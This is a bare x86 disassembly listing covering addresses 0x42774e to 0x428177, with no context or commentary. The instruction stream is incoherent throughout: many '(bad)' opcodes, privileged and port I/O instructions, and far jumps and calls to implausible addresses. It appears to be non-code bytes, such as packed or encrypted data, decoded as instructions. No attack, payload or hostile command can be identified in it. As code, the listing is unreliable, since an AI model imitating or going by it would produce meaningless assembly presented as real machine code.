  42774e:	mov    bl,0x74
  427750:	test   eax,0x3017f69
  427755:	jne    0x4277a3
  427757:	std    
  427758:	and    ebp,esi
  42775a:	jg     0x59b49dd6
  427760:	xchg   ebp,eax
  427761:	or     eax,0xb6cb70a5
  427766:	fwait
  427767:	dec    eax
  427768:	daa    
  427769:	fstp   DWORD PTR [eax-0x18bcc934]
  42776f:	cld    
  427770:	sub    ah,al
  427772:	mov    eax,0x59b29337
  427777:	pop    ss
  427778:	mov    BYTE PTR [ebx-0x3c26f530],dh
  42777e:	jmp    0xe28f9bc4
  427783:	mov    bh,0xf8
  427785:	xor    ch,BYTE PTR ss:[edi-0x7f]
  427789:	cli    
  42778a:	pop    ss
  42778b:	lods   al,BYTE PTR ds:[esi]
  42778c:	bound  ebp,QWORD PTR ds:0x66a644ca
  427792:	iret   
  427793:	pusha  
  427794:	push   edi
  427795:	out    dx,al
  427796:	mov    dl,0x5d
  427798:	xchg   ebp,eax
  427799:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  42779b:	sbb    edi,DWORD PTR [eax+0x0]
  42779e:	jno    0x427781
  4277a0:	ss xchg esi,eax
  4277a2:	outs   dx,BYTE PTR ds:[esi]
  4277a3:	xchg   esi,eax
  4277a4:	daa    
  4277a5:	mov    eax,0x8f1ef933
  4277aa:	push   es
  4277ab:	xchg   BYTE PTR [edx+0x65],ah
  4277ae:	cmc    
  4277af:	scas   eax,DWORD PTR es:[edi]
  4277b0:	js     0x4277eb
  4277b2:	retf   
  4277b3:	enter  0x2cad,0xbd
  4277b7:	fbstp  TBYTE PTR [ebp-0x58a99240]
  4277bd:	push   ds
  4277be:	fwait
  4277bf:	dec    ebp
  4277c0:	mov    al,ds:0x49e6e5a3
  4277c5:	adc    bh,BYTE PTR [edi+0x698ba972]
  4277cb:	push   ebx
  4277cc:	mov    bh,BYTE PTR [esi]
  4277ce:	in     al,dx
  4277cf:	mov    al,0xb2
  4277d1:	dec    edi
  4277d2:	or     BYTE PTR [ecx],ch
  4277d4:	ret    0x6cb3
  4277d7:	stc    
  4277d8:	mov    BYTE PTR [edx-0x62],cl
  4277db:	pop    eax
  4277dc:	mov    ecx,0x89ea613e
  4277e1:	(bad)  
  4277e2:	in     al,0xa9
  4277e4:	aam    0xa0
  4277e6:	das    
  4277e7:	and    al,0x93
  4277e9:	cs popa 
  4277eb:	daa    
  4277ec:	ins    BYTE PTR es:[edi],dx
  4277ed:	loopne 0x427837
  4277ef:	cmp    DWORD PTR [ebp-0x46],ebp
  4277f2:	popf   
  4277f3:	(bad)  
  4277f5:	retf   0xbec8
  4277f8:	mov    gs,WORD PTR [edx]
  4277fa:	test   DWORD PTR [esi],ecx
  4277fc:	mov    BYTE PTR ds:0xdc8ce29,bl
  427802:	sub    al,BYTE PTR [ebx+0x45]
  427805:	mov    ds:0xbf2dcbaf,al
  42780a:	mov    cl,0x40
  42780c:	test   eax,0xe3f6e5a3
	...
  427871:	add    BYTE PTR [eax],al
  427873:	add    BYTE PTR [edx],bl
  427875:	mov    cl,BYTE PTR [ebx]
  427877:	inc    ebp
  427878:	fwait
  427879:	lds    ebx,FWORD PTR [esi-0x21]
  42787c:	jo     0x4278e3
  42787e:	fldl2e 
  427880:	das    
  427881:	imul   edx,DWORD PTR [ecx+0x58],0xfffffff1
  427885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427886:	add    DWORD PTR [eax],eax
  427888:	add    eax,0xc0000001
  42788d:	ror    DWORD PTR [esi],1
  42788f:	sub    dh,bl
  427891:	repz das 
  427893:	jge    0x4278ac
  427895:	cli    
  427896:	sbb    eax,0x47810609
  42789b:	mov    dl,0xd3
  42789d:	iret   
  42789e:	jae    0x42784d
  4278a0:	(bad)  
  4278a1:	mov    ch,0x65
  4278a3:	add    DWORD PTR gs:[ecx+0x4c],esi
  4278a7:	scas   eax,DWORD PTR es:[edi]
  4278a8:	mov    bl,0xe0
  4278aa:	or     DWORD PTR [ebx+0x37],edi
  4278ad:	lahf   
  4278ae:	enter  0x53ce,0xbe
  4278b2:	mov    ebp,0x79c468b5
  4278b7:	xchg   esi,eax
  4278b8:	jmp    0xc457960d
  4278bd:	xchg   esi,eax
  4278be:	add    al,0x8f
  4278c0:	sbb    BYTE PTR [esi],dl
  4278c2:	fild   QWORD PTR [esp+edi*4-0x10651622]
  4278c9:	fcmove st,st(7)
  4278cb:	cmp    DWORD PTR [ebp+0x4a],esi
  4278ce:	call   0x52e9ff9c
  4278d3:	outs   dx,BYTE PTR ds:[esi]
  4278d4:	or     ebp,edi
  4278d6:	push   eax
  4278d7:	mov    esi,?
  4278d9:	add    BYTE PTR [edx+0x69c24822],ch
  4278df:	lahf   
  4278e0:	fdiv   DWORD PTR [eax]
  4278e2:	mov    ecx,0xe31bc4e1
  4278e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4278e8:	mov    ss,WORD PTR ds:0xa4463170
  4278ee:	retf   0x5a3d
  4278f1:	nop
  4278f2:	sbb    eax,0x126da65c
  4278f7:	fcmovne st,st(0)
  4278f9:	and    eax,DWORD PTR [ebp+0x10]
  4278fc:	mov    WORD PTR [edi],?
  4278fe:	jmp    0x427929
  427900:	sti    
  427901:	scas   al,BYTE PTR es:[edi]
  427902:	or     al,0xc7
  427904:	bound  ecx,QWORD PTR [edi]
  427906:	inc    edi
  427907:	mov    al,0xcd
  427909:	or     bl,cl
  42790b:	dec    ecx
  42790c:	fcomp  DWORD PTR [ebp-0x6b]
  42790f:	or     bl,BYTE PTR ss:[esi]
  427912:	imul   BYTE PTR [esp+edx*2+0x783f20db]
  427919:	jmp    0xfa9cb3f8
  42791e:	test   BYTE PTR [ecx],dh
  427920:	mov    cl,0x49
  427922:	jecxz  0x42797c
  427924:	in     eax,0x21
  427926:	sbb    ah,BYTE PTR [eax]
  427928:	loope  0x4278ed
  42792a:	inc    esi
  42792b:	aam    0x5f
  42792d:	push   es
  42792e:	fadd   DWORD PTR ds:0xb0a863a1
  427934:	ficomp WORD PTR ds:0x4980ffaa
  42793a:	int    0x67
  42793c:	add    bh,BYTE PTR [esi-0x41]
  42793f:	ja     0x427963
  427941:	test   DWORD PTR [eax-0x7a],edx
  427944:	loop   0x427926
  427946:	imul   edi,edi,0x516a82f6
  42794c:	pop    ebp
  42794d:	div    DWORD PTR ss:[edx]
  427950:	or     eax,0x1b870faa
  427955:	add    bh,BYTE PTR [eax]
  427957:	frstor [ebx]
  427959:	(bad)  
  42795a:	fisub  DWORD PTR [edx]
  42795c:	push   0xffffffa5
  42795e:	dec    eax
  42795f:	and    BYTE PTR [ebp+0x6156dad4],0x84
  427966:	call   0x6740:0xe6ccca20
  42796d:	dec    esp
  42796e:	or     bl,BYTE PTR [edi+0x4da77fb4]
  427974:	pop    edx
  427975:	jno    0x427938
  427977:	and    BYTE PTR [ecx-0x72],cl
  42797a:	jge    0x4279a7
  42797c:	push   ds
  42797d:	mov    edx,0x9c364f4f
  427982:	sar    esp,0x28
  427985:	jecxz  0x42795e
  427987:	xor    ecx,edi
  427989:	sar    BYTE PTR [ebx],1
  42798b:	repz adc DWORD PTR [ecx],0xf2f176
	...
  4279f2:	add    BYTE PTR [eax],al
  4279f4:	call   0xdea3:0xffa3ffdd
  4279fb:	std    
  4279fc:	inc    edx
  4279fd:	jne    0x4279d7
  4279ff:	sub    DWORD PTR [esi-0x9cf4d3b],0xffffffa7
  427a06:	add    DWORD PTR [eax],eax
  427a08:	add    eax,0x26000001
  427a0d:	pushf  
  427a0e:	not    DWORD PTR [ebp+0x7b62f101]
  427a14:	mov    ah,BYTE PTR ds:[ebx]
  427a17:	cmp    al,0x48
  427a19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a1a:	fbstp  TBYTE PTR [edx-0x7e6ec604]
  427a21:	psadbw mm1,QWORD PTR fs:[ebp-0x47]
  427a26:	xor    al,0xc2
  427a28:	inc    DWORD PTR [ecx]
  427a2a:	cmp    eax,0x295f4b37
  427a2f:	dec    edi
  427a30:	mov    al,0x2a
  427a32:	test   al,0xfc
  427a34:	mov    edi,0x84668afb
  427a39:	cmp    al,0x4e
  427a3b:	stos   BYTE PTR es:[edi],al
  427a3c:	(bad)  
  427a3d:	stc    
  427a3e:	inc    ebx
  427a3f:	pop    edx
  427a40:	sti    
  427a41:	pushf  
  427a42:	jbe    0x427a0e
  427a44:	loop   0x4279cd
  427a46:	xchg   ebx,eax
  427a47:	ret    
  427a48:	lods   al,BYTE PTR ds:[esi]
  427a49:	loop   0x427a94
  427a4b:	int3   
  427a4c:	icebp  
  427a4d:	jecxz  0x427a7e
  427a4f:	sub    al,0xc4
  427a51:	jmp    0xe48b:0xf8d67233
  427a58:	pusha  
  427a59:	adc    cl,BYTE PTR [edx+0x65]
  427a5c:	mov    eax,ds:0xc30dcd08
  427a61:	shl    BYTE PTR [esi-0x69],1
  427a64:	push   ds
  427a65:	jg     0x427a94
  427a67:	jmp    0x427a3d
  427a69:	dec    esp
  427a6a:	aaa    
  427a6b:	mov    edi,0xe88c2982
  427a70:	dec    edi
  427a71:	inc    eax
  427a72:	out    dx,al
  427a73:	aad    0xd6
  427a75:	in     eax,0xf4
  427a77:	out    dx,eax
  427a78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a79:	inc    edi
  427a7a:	(bad)  
  427a7b:	xchg   esp,eax
  427a7c:	mov    ds,ebp
  427a7e:	jnp    0x427a42
  427a80:	ffreep st(5)
  427a82:	scas   al,BYTE PTR es:[edi]
  427a83:	mov    al,0x16
  427a85:	and    eax,0xa651629e
  427a8a:	cmp    ecx,DWORD PTR [ecx+0x22]
  427a8d:	mov    ebp,DWORD PTR [eax-0x6e]
  427a90:	repz mov dh,0xc9
  427a93:	rcl    DWORD PTR [edi+eax*1+0x74e7631e],cl
  427a9a:	xchg   esp,eax
  427a9b:	and    ah,cl
  427a9d:	pop    ebx
  427a9e:	stos   DWORD PTR es:[edi],eax
  427a9f:	xchg   al,ch
  427aa1:	and    DWORD PTR [edi+0x61895086],ebx
  427aa7:	hlt    
  427aa8:	nop
  427aa9:	push   esi
  427aaa:	scas   eax,DWORD PTR es:[edi]
  427aab:	or     esp,ebp
  427aad:	mov    edx,0xa8cea125
  427ab2:	adc    DWORD PTR [ecx+0x68ca7660],0x6b
  427ab9:	adc    al,0x82
  427abb:	pop    edx
  427abc:	or     BYTE PTR [ebx],bl
  427abe:	push   esp
  427abf:	fsub   st(5),st
  427ac1:	sahf   
  427ac2:	das    
  427ac3:	xchg   esp,eax
  427ac4:	and    eax,0xddb019a8
  427ac9:	dec    ecx
  427aca:	jo     0x427ac1
  427acc:	cmp    al,0x8c
  427ace:	sbb    ah,BYTE PTR [eax-0x6a]
  427ad1:	jp     0x427a6a
  427ad3:	cmp    al,0xe8
  427ad5:	inc    esp
  427ad6:	ror    ah,1
  427ad8:	mov    dh,0x7c
  427ada:	fmulp  st(4),st
  427adc:	and    DWORD PTR [esi-0x4289453a],esp
  427ae2:	pusha  
  427ae3:	push   eax
  427ae4:	ins    DWORD PTR es:[edi],dx
  427ae5:	outs   dx,DWORD PTR ds:[esi]
  427ae6:	xchg   ecx,eax
  427ae7:	retf   0x89f3
  427aea:	sbb    al,0x50
  427aec:	xchg   ebp,ebp
  427aee:	retf   0x8cf3
  427af1:	mov    ds:0xe8956072,eax
  427af6:	adc    eax,0xe6f0f7e7
  427afb:	leave  
  427afc:	xchg   ebx,eax
  427afd:	idiv   DWORD PTR [eax-0x2f26d28a]
  427b03:	imul   edx,DWORD PTR [esi],0x9
  427b06:	imul   DWORD PTR [ebx]
  427b08:	fbstp  TBYTE PTR [esi]
  427b0a:	inc    ecx
  427b0b:	adc    dh,BYTE PTR [ebx-0x3492e860]
	...
  427b71:	add    BYTE PTR [eax],al
  427b73:	add    dl,cl
  427b75:	mov    edx,DWORD PTR [edx+0x7b]
  427b78:	push   ebx
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	div    BYTE PTR [ebx]
  427b81:	sub    BYTE PTR [edx+0x1a8fb67],al
  427b87:	add    BYTE PTR ds:0x1000001,al
  427b8d:	out    0xed,al
  427b8f:	aad    0xe2
  427b91:	dec    eax
  427b92:	mov    cl,0x61
  427b94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427b95:	mov    ds:0x871480d5,al
  427b9a:	push   edi
  427b9b:	add    eax,edx
  427b9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b9e:	cmp    eax,0x50ae9fd3
  427ba3:	ficomp WORD PTR [esi+0x2]
  427ba6:	test   al,0x1b
  427ba8:	cmp    dl,BYTE PTR [eax+0x2c]
  427bab:	aam    0x85
  427bad:	jne    0x427c20
  427baf:	ins    DWORD PTR es:[edi],dx
  427bb0:	sbb    BYTE PTR ds:0xb9e5850e,0xab
  427bb7:	inc    edx
  427bb8:	pop    ss
  427bb9:	mov    ebp,ebp
  427bbb:	in     eax,0x36
  427bbd:	cwde   
  427bbe:	clc    
  427bbf:	sbb    DWORD PTR [eax-0x79f21823],ecx
  427bc5:	and    eax,0xbed7018b
  427bca:	mov    dl,0x1f
  427bcc:	fiadd  DWORD PTR [edi]
  427bce:	aas    
  427bcf:	pop    eax
  427bd0:	lods   eax,DWORD PTR ds:[esi]
  427bd1:	cwde   
  427bd2:	in     eax,0xe2
  427bd4:	pop    es
  427bd5:	arpl   WORD PTR [edi+edx*1],bp
  427bd8:	cmc    
  427bd9:	push   ebx
  427bda:	mov    ebx,0xc7838b4
  427bdf:	or     BYTE PTR [ecx-0x68],0x3d
  427be3:	outs   dx,DWORD PTR ds:[esi]
  427be4:	adc    BYTE PTR [esi+0x4e],bh
  427be7:	sub    dh,BYTE PTR [ecx+0x43]
  427bea:	xchg   esi,eax
  427beb:	jb     0x427b77
  427bed:	and    al,0xa2
  427bef:	dec    esp
  427bf0:	shr    DWORD PTR [eax-0x64ee5304],cl
  427bf6:	lea    esi,[esi+edx*2]
  427bf9:	ror    DWORD PTR [ebx],1
  427bfb:	out    dx,eax
  427bfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427bfd:	ds xchg edx,eax
  427bff:	cmp    DWORD PTR [eax],ebp
  427c01:	leave  
  427c02:	push   edi
  427c03:	mov    bl,0x86
  427c05:	loope  0x427bec
  427c07:	stos   BYTE PTR es:[edi],al
  427c08:	and    bl,bh
  427c0a:	dec    esi
  427c0b:	inc    esp
  427c0c:	std    
  427c0d:	sbb    bh,BYTE PTR [ebx+0x43]
  427c10:	lock sti 
  427c12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c13:	pop    es
  427c14:	cli    
  427c15:	retf   
  427c16:	jg     0x427c94
  427c18:	xor    DWORD PTR [ecx+0x63d778f3],esi
  427c1e:	and    BYTE PTR [ebx+ebx*2],dl
  427c21:	pop    esp
  427c22:	stc    
  427c23:	mov    bh,0xe4
  427c25:	or     eax,0xb8750ad4
  427c2a:	bound  eax,QWORD PTR [edx]
  427c2c:	sbb    esp,edi
  427c2e:	or     eax,0x6c957985
  427c33:	sub    ch,dl
  427c35:	pop    ebp
  427c36:	push   ebx
  427c37:	sub    DWORD PTR [edi],edx
  427c39:	sbb    al,BYTE PTR [esi+0x4ec761db]
  427c3f:	stos   DWORD PTR es:[edi],eax
  427c40:	xchg   esi,eax
  427c41:	adc    DWORD PTR [edx+0x21c917b8],ebp
  427c47:	repnz in al,dx
  427c49:	adc    eax,DWORD PTR [esi]
  427c4b:	mov    eax,ds:0x2d80318c
  427c50:	in     al,dx
  427c51:	retf   
  427c52:	xor    bl,ah
  427c54:	in     eax,0x6f
  427c56:	dec    ecx
  427c57:	jmp    0x427ca7
  427c59:	mov    eax,0xa25a1d8c
  427c5e:	js     0x427c41
  427c60:	retf   
  427c61:	inc    edx
  427c62:	and    eax,esi
  427c64:	cli    
  427c65:	pushf  
  427c66:	test   DWORD PTR [ebp+0x41],eax
  427c69:	sub    esi,DWORD PTR [ebx+eiz*8]
  427c6c:	push   ebx
  427c6d:	mov    edi,DWORD PTR [ecx+0x3372185]
  427c73:	je     0x427c91
  427c75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c76:	cmc    
  427c77:	std    
  427c78:	sbb    DWORD PTR [ecx-0x28f36f9f],ebx
  427c7e:	inc    esp
  427c7f:	mov    bl,0x23
  427c81:	retf   0xa332
  427c84:	imul   esp,DWORD PTR [edi-0x31],0x1a
  427c88:	xchg   BYTE PTR [ecx+ecx*1-0x4],ah
  427c8c:	shr    DWORD PTR [edx+0xf871d9],1
	...
  427cf2:	add    BYTE PTR [eax],al
  427cf4:	mov    ds:0xf343b050,eax
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0xf52e5d44,ebx
  427d02:	dec    eax
  427d03:	stos   BYTE PTR es:[edi],al
  427d04:	add    BYTE PTR [edx+0x1050001],ch
  427d0a:	add    BYTE PTR [eax],al
  427d0c:	rol    DWORD PTR [edi-0x6c],1
  427d0f:	shr    edx,cl
  427d11:	scas   eax,DWORD PTR es:[edi]
  427d12:	enter  0xaccf,0xd5
  427d16:	sub    al,0x5c
  427d18:	xor    edx,ebp
  427d1a:	sbb    al,0x1
  427d1c:	or     DWORD PTR [edx-0x4549cdfe],eax
  427d22:	xlat   BYTE PTR ds:[bx]
  427d24:	test   BYTE PTR [edi+0x67aa1f66],dl
  427d2a:	pop    ss
  427d2b:	out    dx,al
  427d2c:	repz fucomip st,st(0)
  427d2f:	jb     0x427d36
  427d31:	dec    esi
  427d32:	(bad)  
  427d33:	mov    ah,0xd3
  427d35:	dec    edi
  427d36:	mov    edi,0x508261b3
  427d3b:	or     al,0xd1
  427d3d:	nop
  427d3e:	scas   al,BYTE PTR es:[edi]
  427d3f:	enter  0x5da9,0x19
  427d43:	stos   DWORD PTR es:[edi],eax
  427d44:	mov    ebx,DWORD PTR [ebp+esi*8-0x6813dac]
  427d4b:	fist   DWORD PTR [esi-0x43]
  427d4e:	xchg   ecx,eax
  427d4f:	pop    esp
  427d50:	cmp    al,0x86
  427d52:	mov    ebx,0xe0c328dc
  427d57:	fistp  QWORD PTR [edx]
  427d59:	pop    ecx
  427d5a:	push   edi
  427d5b:	xchg   ecx,eax
  427d5c:	rol    BYTE PTR [ecx+edx*2+0x31],cl
  427d60:	(bad)  
  427d61:	mov    eax,ds:0xd886eb95
  427d66:	hlt    
  427d67:	cmp    esi,esp
  427d69:	sahf   
  427d6a:	bound  esi,QWORD PTR [ebx+0x4e]
  427d6d:	cmp    eax,0x7623bdba
  427d72:	dec    esp
  427d73:	addr16 jmp 0xeeb3812c
  427d79:	xchg   ebx,eax
  427d7a:	xchg   esi,eax
  427d7b:	xchg   ebx,eax
  427d7c:	imul   ebp,DWORD PTR [ebx],0xffffffb4
  427d7f:	stos   BYTE PTR es:[edi],al
  427d80:	and    bl,0x12
  427d83:	xchg   esi,eax
  427d84:	or     eax,0x1cbdc7e2
  427d89:	pusha  
  427d8a:	mov    BYTE PTR [ecx],ch
  427d8c:	retf   
  427d8d:	in     al,dx
  427d8e:	mov    ebx,0x3b9e7c2d
  427d93:	into   
  427d94:	ror    DWORD PTR [ecx+ebx*1],cl
  427d97:	inc    eax
  427d98:	(bad)  
  427d9a:	std    
  427d9b:	ins    DWORD PTR es:[edi],dx
  427d9c:	mov    edx,0x1b51b847
  427da1:	xchg   esp,eax
  427da2:	dec    edi
  427da3:	dec    edi
  427da4:	xchg   esp,eax
  427da5:	and    dl,BYTE PTR [edx+0x3]
  427da8:	push   ebx
  427da9:	cli    
  427daa:	mov    cs,WORD PTR [ecx-0x72edc6e0]
  427db0:	or     al,0x48
  427db2:	loopne 0x427d93
  427db4:	mov    ?,esi
  427db6:	push   ecx
  427db7:	push   cs
  427db8:	mov    ecx,0x3c85da10
  427dbd:	sub    al,0xb3
  427dbf:	push   edx
  427dc0:	push   0xffffffab
  427dc2:	in     eax,0x4d
  427dc4:	pop    edi
  427dc5:	mov    cl,0xf0
  427dc7:	sbb    edx,DWORD PTR [eax]
  427dc9:	cdq    
  427dca:	out    dx,al
  427dcb:	pop    esp
  427dcc:	mov    al,0xb0
  427dce:	nop
  427dcf:	sbb    al,0x4c
  427dd1:	int    0x66
  427dd3:	mov    esi,0xbb6e0dbe
  427dd8:	push   es
  427dd9:	xor    BYTE PTR [eax+0x1a],bl
  427ddc:	cmp    DWORD PTR ds:0xfffaf782,esi
  427de2:	push   0x4e075a31
  427de7:	outs   dx,BYTE PTR ds:[esi]
  427de8:	cld    
  427de9:	hlt    
  427dea:	idiv   ch
  427dec:	sahf   
  427ded:	data16 je 0x427e6c
  427df0:	rcl    DWORD PTR [edi-0x1edfab36],cl
  427df6:	test   BYTE PTR [edx+0x4],0xbe
  427dfa:	hlt    
  427dfb:	ja     0x427d9f
  427dfd:	scas   eax,DWORD PTR es:[edi]
  427dfe:	lea    esi,[edx]
  427e00:	and    DWORD PTR [edx+edx*4],ebx
  427e03:	mov    DWORD PTR [esp+edx*4-0x47331569],edi
  427e0a:	fstp   QWORD PTR ds:0xd6943832
  427e10:	test   DWORD PTR [eax],0x0
	...
  427e72:	add    BYTE PTR [eax],al
  427e74:	mov    eax,0x6d3c25f1
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	idiv   BYTE PTR [ebp-0x54fa372b]
  427e86:	add    DWORD PTR [eax],eax
  427e88:	add    eax,0x7d000001
  427e8d:	pop    ebp
  427e8e:	xor    ebx,ebx
  427e90:	xchg   ebx,eax
  427e91:	rol    DWORD PTR [edx],0xc6
  427e94:	call   0xd930dcba
  427e99:	xchg   BYTE PTR [ebx],bl
  427e9b:	inc    ebx
  427e9c:	mov    dl,0xfd
  427e9e:	(bad)  
  427e9f:	fmul   QWORD PTR [ecx+0x41eeaf59]
  427ea5:	pop    esi
  427ea6:	and    al,BYTE PTR [edi]
  427ea8:	mov    ch,0xec
  427eaa:	or     edi,DWORD PTR [edx]
  427eac:	ret    0x74e5
  427eaf:	or     al,0xb0
  427eb1:	mov    al,0x55
  427eb3:	xchg   edx,eax
  427eb4:	dec    ecx
  427eb5:	mov    edi,0x2eb516a1
  427eba:	jbe    0x427eea
  427ebc:	inc    eax
  427ebd:	and    al,0x33
  427ec0:	fwait
  427ec1:	leave  
  427ec2:	push   0x5a37f177
  427ec7:	push   ebp
  427ec8:	mov    ebp,0x43b18fdf
  427ecd:	ret    0xf3d
  427ed0:	ins    BYTE PTR es:[edi],dx
  427ed1:	add    DWORD PTR [ebp-0x15],0xbf723331
  427ed8:	mov    ah,0xd6
  427eda:	out    0xa8,eax
  427edc:	fnstenv [ebx-0x93b03ba]
  427ee2:	mov    al,ah
  427ee4:	loope  0x427ee8
  427ee6:	cmp    DWORD PTR [ebx+0xdbd6243],ebx
  427eec:	xchg   ecx,eax
  427eed:	inc    eax
  427eee:	js     0x427e94
  427ef0:	adc    esi,DWORD PTR [eax-0x36516d78]
  427ef6:	adc    DWORD PTR [eax+0x15fe94d],0x4495f0d3
  427f00:	and    eax,0xa4480c55
  427f05:	sbb    eax,0x67753b81
  427f0a:	cwde   
  427f0b:	push   edx
  427f0c:	sbb    eax,0xcc10c469
  427f11:	nop
  427f12:	fwait
  427f13:	sub    BYTE PTR [ebp+0x432e7e89],al
  427f19:	mov    eax,ds:0x700acd99
  427f1e:	add    BYTE PTR [esp+0x531c510c],ah
  427f25:	stc    
  427f26:	and    cl,BYTE PTR [eax-0x2a6fcf9e]
  427f2c:	jb     0x427f11
  427f2e:	push   ss
  427f2f:	and    ah,BYTE PTR [ecx]
  427f31:	dec    edx
  427f32:	or     esp,esp
  427f34:	or     eax,0xa6aafb0
  427f39:	or     al,0x57
  427f3b:	inc    eax
  427f3c:	mov    eax,0x6cd88a80
  427f41:	jmp    0x28b5:0xfd326c79
  427f48:	sub    ebp,DWORD PTR [ebx-0x15]
  427f4b:	sub    eax,DWORD PTR [eax-0x341d9cfe]
  427f51:	arpl   WORD PTR ds:0x911f,bp
  427f56:	and    al,0x0
  427f58:	das    
  427f59:	mov    ah,0x61
  427f5b:	mov    ch,0x1
  427f5d:	fisubr DWORD PTR [esi+0x7e]
  427f60:	jecxz  0x427fba
  427f62:	aas    
  427f63:	sbb    al,BYTE PTR [esi-0x4e]
  427f66:	sub    al,0xdc
  427f68:	scas   eax,DWORD PTR es:[edi]
  427f69:	dec    esi
  427f6a:	int3   
  427f6b:	add    ch,ah
  427f6d:	jecxz  0x427fee
  427f6f:	inc    eax
  427f70:	das    
  427f71:	xor    eax,0xdd5ae991
  427f76:	imul   ebx,DWORD PTR [esi],0xffffff86
  427f79:	stos   BYTE PTR es:[edi],al
  427f7a:	sahf   
  427f7b:	inc    ecx
  427f7c:	inc    edx
  427f7d:	sub    DWORD PTR [edi-0x7b],edx
  427f80:	pusha  
  427f81:	ss add edi,ebx
  427f84:	cdq    
  427f85:	xchg   esp,eax
  427f86:	dec    edx
  427f87:	in     eax,dx
  427f88:	retf   
  427f89:	mov    ds:0x661b6ebd,eax
  427f8e:	aaa    
  427f8f:	call   0x428013
	...
  427ff4:	mov    cl,0xa7
  427ff6:	dec    ebx
  427ff7:	das    
  427ff8:	pop    edi
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	xchg   edx,eax
  428001:	add    DWORD PTR [ebx-0x2d],esp
  428004:	or     ch,BYTE PTR [ecx+eax*1+0x10500]
  42800b:	add    BYTE PTR [eax-0x47],dh
  42800e:	jns    0xf005cb4
  428014:	pop    eax
  428015:	pop    ecx
  428016:	xor    DWORD PTR [ebp+0x342f1884],edi
  42801c:	jb     0x427fd1
  42801e:	jne    0x428093
  428020:	sub    BYTE PTR [edi-0x1938250],dl
  428026:	mov    ds:0x2992eae0,al
  42802b:	pop    ebp
  42802c:	dec    eax
  42802d:	test   al,0x5c
  42802f:	fidiv  DWORD PTR [eax]
  428031:	gs sahf 
  428033:	cmp    dl,BYTE PTR [eax-0x32]
  428036:	stos   BYTE PTR es:[edi],al
  428037:	fs sahf 
  428039:	pop    edx
  42803a:	mov    al,0x42
  42803c:	leave  
  42803d:	cdq    
  42803e:	int3   
  42803f:	(bad)  
  428040:	or     eax,eax
  428042:	pop    ds
  428043:	rcl    ebx,0xca
  428046:	enter  0xd771,0x55
  42804a:	pop    ebp
  42804b:	xor    DWORD PTR ds:[ecx],edi
  42804e:	pop    edi
  42804f:	push   esp
  428050:	sub    al,0xa7
  428052:	push   eax
  428053:	mov    al,es:0xbbed007
  428059:	jle    0x428068
  42805b:	xor    al,0xb1
  42805d:	sbb    esi,DWORD PTR ds:0xd9bceb9d
  428063:	fwait
  428064:	nop
  428065:	dec    edx
  428066:	and    cl,BYTE PTR [eax]
  428068:	cmp    BYTE PTR [eax-0x2c],ah
  42806b:	dec    ebp
  42806c:	loope  0x4280e2
  42806e:	rcl    esp,0xb7
  428071:	mov    edx,0x1b1cfefe
  428076:	out    dx,eax
  428077:	xor    al,0xcd
  428079:	ss jo  0x427ffe
  42807c:	mov    edx,0xd80074b2
  428081:	int    0xe7
  428083:	sub    edi,esp
  428085:	xchg   esp,eax
  428086:	stos   BYTE PTR es:[edi],al
  428087:	or     ebp,DWORD PTR [eax-0x2b]
  42808a:	and    eax,0xd80fa14e
  42808f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428090:	or     al,0xa4
  428092:	cmp    DWORD PTR [ebx-0x74],edi
  428095:	pop    ebp
  428096:	imul   ebp,DWORD PTR [esi-0x4e],0xffffffff
  42809a:	cwde   
  42809b:	pop    esp
  42809c:	fwait
  42809d:	dec    esp
  42809e:	mov    bl,0x27
  4280a0:	pop    esp
  4280a1:	cli    
  4280a2:	popa   
  4280a3:	pushf  
  4280a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280a5:	push   ss
  4280a6:	xchg   edi,eax
  4280a7:	fucomi st,st(6)
  4280a9:	jo     0x4280b4
  4280ab:	lods   eax,DWORD PTR ds:[esi]
  4280ac:	jmp    0x5d21:0x7c54a99b
  4280b3:	mov    ebx,DWORD PTR [ecx-0x109d60a1]
  4280b9:	or     BYTE PTR [ebp+0x59],ah
  4280bc:	data16 scas al,BYTE PTR es:[edi]
  4280be:	adc    DWORD PTR [ebp-0x517bcc17],0xffffff86
  4280c5:	push   es
  4280c6:	add    BYTE PTR [esi],ah
  4280c8:	push   cs
  4280c9:	in     eax,dx
  4280ca:	cwde   
  4280cb:	xchg   edi,eax
  4280cc:	push   edi
  4280cd:	retf   
  4280ce:	rcr    BYTE PTR [edi+0x74],0x33
  4280d2:	or     BYTE PTR ds:0x693f1c27,0x43
  4280d9:	or     BYTE PTR [esi+0x5a],cl
  4280dc:	retf   
  4280dd:	mov    ds:0x99358fc7,al
  4280e2:	mov    BYTE PTR [ebp-0xed7281c],dh
  4280e8:	mov    bh,0x9e
  4280ea:	sub    DWORD PTR [ebp+0x3e9427e0],edi
  4280f0:	hlt    
  4280f1:	mov    eax,ds:0x6ada6519
  4280f6:	sbb    BYTE PTR [ecx],dh
  4280f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280f9:	inc    BYTE PTR [ecx+esi*1+0x60619c6f]
  428100:	mov    al,ch
  428102:	xor    ch,BYTE PTR [eax]
  428104:	jg     0x42809e
  428106:	pop    ss
  428107:	add    DWORD PTR [eax],edx
  428109:	jae    0x428140
  42810b:	mov    dh,0x3
  42810d:	out    dx,eax
  42810e:	cwde   
  42810f:	mov    eax,ecx
	...
  428171:	add    BYTE PTR [eax],al
  428173:	add    bh,bl
  428175:	out    dx,al
  428176:	std    
  428177:	dec    esp
